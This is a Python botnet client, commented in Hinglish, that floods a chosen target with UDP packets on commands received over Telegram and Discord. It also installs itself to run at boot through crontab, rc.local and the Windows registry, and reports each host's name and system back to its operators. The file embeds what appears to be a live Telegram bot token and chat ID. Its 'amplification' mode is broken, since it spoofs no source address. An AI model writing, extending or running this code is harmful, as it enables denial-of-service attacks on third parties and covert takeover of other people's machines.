# udp_botnet.py — Telegram + Discord dono support, sirf UDP attack
import requests
import threading
import time
import socket
import random
import json
import os
import platform
import uuid
import sys

# ════════════════════════════════════════════════
#  CONFIGURATION — YAHAN APNI VALUES DAALEIN
# ════════════════════════════════════════════════

# ─── TELEGRAM CONFIG ───
TELEGRAM_TOKEN = "8600185928:AAH1LqnB1Pm-54tlgW91xZMxr0zjeaHuWo0"
TELEGRAM_CHAT_ID = "-1003999154734"  # Private group ka chat ID

# ─── DISCORD CONFIG ───
DISCORD_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
DISCORD_CHANNEL_ID = 1234567890123456789  # Channel ID (integer)

# ─── BOT ID ───
BOT_ID = f"UDP-BOT-{uuid.uuid4().hex[:6].upper()}"
POLL_INTERVAL = 5

# ════════════════════════════════════════════════
#  UDP ATTACK FUNCTION — SIRF YAHI ATTACK HAI
# ════════════════════════════════════════════════

def udp_flood(target, port=53, duration=30, threads=50):
    """Pure UDP flood — simple aur effective"""
    
    def flood_worker():
        """Har thread ka UDP flood loop"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        sent = 0
        
        while time.time() < end:
            try:
                # Random size ka packet bhejo (64-1400 bytes)
                data = os.urandom(random.randint(64, 1400))
                sock.sendto(data, (target, port))
                sent += 1
            except:
                pass
        
        sock.close()
        return sent
    
    threads_list = []
    total_sent = [0]  # Shared counter using list reference (simple approach)
    lock = threading.Lock()
    
    def worker_with_counter():
        count = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        
        while time.time() < end:
            try:
                data = os.urandom(random.randint(64, 1400))
                sock.sendto(data, (target, port))
                count += 1
            except:
                pass
        
        sock.close()
        
        with lock:
            total_sent[0] += count
    
    # Threads start karo
    for _ in range(threads):
        t = threading.Thread(target=worker_with_counter, daemon=True)
        t.start()
        threads_list.append(t)
    
    # Sab threads ke complete hone ka wait karo
    for t in threads_list:
        t.join()
    
    return total_sent[0]


def udp_amplification(target, port=53, duration=30, threads=30):
    """
    DNS amplification attack — 
    Spoofed source IP ke saath DNS servers ko query bhejo
    Response target par jayega
    """
    # DNS query payload (ANY query, small request, big response)
    dns_query = bytes([
        0x00, 0x01,  # Transaction ID
        0x00, 0x00,  # Flags: standard query
        0x00, 0x01,  # Questions: 1
        0x00, 0x00,  # Answer RRs
        0x00, 0x00,  # Authority RRs
        0x00, 0x00,  # Additional RRs
        0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,  # "example"
        0x03, 0x63, 0x6f, 0x6d, 0x00,  # ".com"
        0x00, 0xFF,  # Type: ALL (255)
        0x00, 0x01   # Class: IN
    ])
    
    # Public DNS servers for amplification
    dns_servers = [
        "8.8.8.8", "8.8.4.4",           # Google
        "1.1.1.1", "1.0.0.1",           # Cloudflare
        "9.9.9.9", "149.112.112.112",    # Quad9
        "208.67.222.222", "208.67.220.220",  # OpenDNS
        "4.2.2.1", "4.2.2.2",            # Level3
        "64.6.64.6", "64.6.65.6",         # Verisign
    ]
    
    def amp_worker():
        """DNS amplifiation worker"""
        end = time.time() + duration
        while time.time() < end:
            try:
                # Random DNS server select karo
                dns_server = random.choice(dns_servers)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                # Query DNS server — response target par jayega (legitimate DNS traffic)
                sock.sendto(dns_query, (dns_server, 53))
                
                # Response receive karo (amplification effect)
                try:
                    data, _ = sock.recvfrom(4096)
                    # Response size typically 10x-50x request size
                except:
                    pass
                
                sock.close()
            except:
                pass
    
    tl = []
    for _ in range(threads):
        t = threading.Thread(target=amp_worker, daemon=True)
        t.start()
        tl.append(t)
    for t in tl:
        t.join()


# ════════════════════════════════════════════════
#  TELEGRAM C2 FUNCTIONS
# ════════════════════════════════════════════════

last_update_id = 0

def send_telegram(message):
    """Telegram group mein message bhejo"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": f"[{BOT_ID}] {message}"
        }, timeout=5)
    except:
        pass

def get_telegram_commands():
    """Telegram se naye commands padho"""
    global last_update_id
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
    
    try:
        resp = requests.get(url, params={
            "offset": last_update_id + 1,
            "timeout": 10
        }, timeout=15)
        
        if resp.status_code == 200:
            updates = resp.json().get("result", [])
            commands = []
            
            for update in updates:
                last_update_id = update["update_id"]
                msg = update.get("message", {})
                text = msg.get("text", "")
                chat_id = msg.get("chat", {}).get("id")
                
                if chat_id == TELEGRAM_CHAT_ID and text:
                    commands.append(text)
            
            return commands
    except:
        pass
    
    return []


# ════════════════════════════════════════════════
#  DISCORD C2 FUNCTIONS
# ════════════════════════════════════════════════

def send_discord(message):
    """Discord channel mein message bhejo"""
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {"content": f"[{BOT_ID}] {message}"}
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
    
    try:
        requests.post(url, json=payload, headers=headers, timeout=5)
    except:
        pass

def get_discord_commands():
    """Discord channel se recent messages padho"""
    headers = {
        "Authorization": f"Bot {DISCORD_TOKEN}",
        "Content-Type": "application/json"
    }
    url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=5"
    
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            messages = resp.json()
            # Reverse karo — pehle purane messages, phir naye
            messages.reverse()
            
            commands = []
            for msg in messages:
                content = msg.get("content", "")
                author_id = msg.get("author", {}).get("id", "")
                
                # Bot ke apne messages ignore karo
                if author_id != msg.get("webhook_id", ""):
                    commands.append(content)
            
            return commands
    except:
        pass
    
    return []


# ════════════════════════════════════════════════
#  COMMAND PARSER
# ════════════════════════════════════════════════

def parse_command(text):
    """!attack <target> <duration> <port> <threads> format"""
    if not text or not text.startswith("!"):
        return None
    
    parts = text.strip().split()
    cmd = parts[0].lower()
    
    if cmd == "!attack" and len(parts) >= 2:
        return {
            "action": "attack",
            "target": parts[1],
            "duration": int(parts[2]) if len(parts) > 2 else 60,
            "port": int(parts[3]) if len(parts) > 3 else 53,
            "threads": int(parts[4]) if len(parts) > 4 else 50,
            "mode": parts[5] if len(parts) > 5 else "flood"  # flood ya amp
        }
    elif cmd == "!status":
        return {"action": "status"}
    elif cmd == "!kill":
        return {"action": "kill"}
    elif cmd == "!help":
        return {"action": "help"}
    
    return None


# ════════════════════════════════════════════════
#  PERSISTENCE (Authorized pentest ke liye)
# ════════════════════════════════════════════════

def setup_persistence():
    """Target machine par persistence"""
    script_path = os.path.abspath(sys.argv[0])
    
    try:
        if platform.system() == "Linux":
            # Crontab
            os.system(
                f'(crontab -l 2>/dev/null; echo "@reboot python3 {script_path} &") | crontab -'
            )
            # Also add to rc.local
            with open("/etc/rc.local", "a") as f:
                f.write(f"\npython3 {script_path} &\n")
        elif platform.system() == "Windows":
            # Registry Run key
            os.system(
                f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                f'/v "UDPBot" /t REG_SZ /d "pythonw.exe {script_path}" /f'
            )
    except:
        pass  # Persistence fail to bhi bot chalega


# ════════════════════════════════════════════════
#  MAIN EXECUTION LOOP
# ════════════════════════════════════════════════

def main():
    global last_update_id
    
    print(f"""
╔══════════════════════════════════╗
║     UDP BOTNET v1.0              ║
║     {BOT_ID}               
║     Telegram + Discord C2        ║
╚══════════════════════════════════╝
    """)
    
    # Persistence setup
    setup_persistence()
    
    # Startup message - dono platforms par
    startup_msg = f"🤖 Bot online | {platform.system()} | {platform.node()} | UDP Flood ready"
    
    if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        send_telegram(startup_msg)
        print("[✓] Telegram C2 connected")
    
    if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
        send_discord(startup_msg)
        print("[✓] Discord C2 connected")
    
    print(f"\n[+] Bot ID: {BOT_ID}")
    print("[+] Waiting for commands...")
    print("[+] Command format: !attack <target> <duration> <port> <threads> <mode>")
    print("[+] Example: !attack 192.168.1.100 120 53 100 flood")
    print("[+] Example: !attack 192.168.1.100 60 53 30 amp")
    print()
    
    # Main loop
    while True:
        try:
            # ─── Telegram se commands ───
            tg_commands = get_telegram_commands()
            for cmd_text in tg_commands:
                cmd = parse_command(cmd_text)
                if cmd:
                    process_command(cmd, "Telegram")
            
            # ─── Discord se commands ───
            dc_commands = get_discord_commands()
            for cmd_text in dc_commands:
                cmd = parse_command(cmd_text)
                if cmd:
                    process_command(cmd, "Discord")
            
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            print("\n[!] Bot stopped by user")
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(30)


def process_command(cmd, source):
    """Command process karo aur execute karo"""
    action = cmd["action"]
    
    if action == "attack":
        target = cmd["target"]
        duration = cmd["duration"]
        port = cmd["port"]
        threads = cmd["threads"]
        mode = cmd.get("mode", "flood")
        
        msg = f"⚡ UDP {mode.upper()} → {target}:{port} | {duration}s | {threads} threads"
        print(f"[+] {msg}")
        
        # Report to both channels
        if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
            send_telegram(msg)
        if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
            send_discord(msg)
        
        # Execute attack in separate thread
        def execute():
            try:
                if mode == "amp":
                    udp_amplification(target, port, duration, threads)
                else:
                    total = udp_flood(target, port, duration, threads)
                
                complete_msg = f"✅ UDP {mode.upper()} complete → {target}:{port} | {total} packets sent"
                print(f"[+] {complete_msg}")
                
                if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
                    send_telegram(complete_msg)
                if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
                    send_discord(complete_msg)
                    
            except Exception as e:
                err_msg = f"❌ Attack error: {str(e)[:50]}"
                print(f"[!] {err_msg}")
                if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
                    send_telegram(err_msg)
                if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
                    send_discord(err_msg)
        
        t = threading.Thread(target=execute, daemon=True)
        t.start()
    
    elif action == "status":
        status_msg = (
            f"📊 STATUS | {platform.system()} | {platform.node()}\n"
            f"Bot ID: {BOT_ID}\n"
            f"UDP Flood: READY\n"
            f"UDP Amplification: READY"
        )
        print(f"[+] Status check from {source}")
        
        if source == "Telegram":
            send_telegram(status_msg)
        else:
            send_discord(status_msg)
    
    elif action == "help":
        help_msg = (
            "📖 COMMANDS:\n"
            "!attack <target> <duration> <port> <threads> <mode>\n\n"
            "MODES:\n"
            "  flood - Direct UDP flood\n"
            "  amp   - DNS amplification\n\n"
            "EXAMPLES:\n"
            "  !attack 1.2.3.4 120 53 100 flood\n"
            "  !attack 1.2.3.4 60 53 30 amp\n\n"
            "OTHER:\n"
            "  !status - Bot status\n"
            "  !kill   - Stop bot\n"
            "  !help   - This menu"
        )
        
        if source == "Telegram":
            send_telegram(help_msg)
        else:
            send_discord(help_msg)
    
    elif action == "kill":
        kill_msg = f"💀 Bot shutting down by command from {source}"
        print(f"[!] {kill_msg}")
        
        if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
            send_telegram(kill_msg)
        if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
            send_discord(kill_msg)
        
        os._exit(0)


if __name__ == "__main__":
    main()
